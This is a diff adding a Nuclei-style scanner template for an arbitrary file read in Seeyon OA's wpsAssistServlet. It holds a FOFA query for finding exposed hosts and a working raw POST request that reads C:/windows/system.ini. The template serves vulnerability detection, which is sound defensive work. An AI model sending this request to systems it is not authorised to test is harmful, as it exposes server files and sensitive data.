@@ -1,0 +1,29 @@
+id: seeyon-oa-wpsassistservlet-file-read
+
+info:
+  name: "致远OA wpsAssistServlet 任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="致远互联-OA"
+      该漏洞允许攻击者通过构造特定请求参数，绕过文件访问控制机制读取服务器端任意文件内容。成功利用可导致系统配置文件、敏感业务数据等非授权访问，建议部署环境立即核查并应用安全补丁。
+  tags: 致远OA
+
+http:
+- raw:
+  - |
+    POST /seeyon/wpsAssistServlet HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Connection: Keep-Alive
+    Content-Type: application/x-www-form-urlencoded
+
+    flag=template&templateUrl=C:/windows/system.ini
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'drivers'
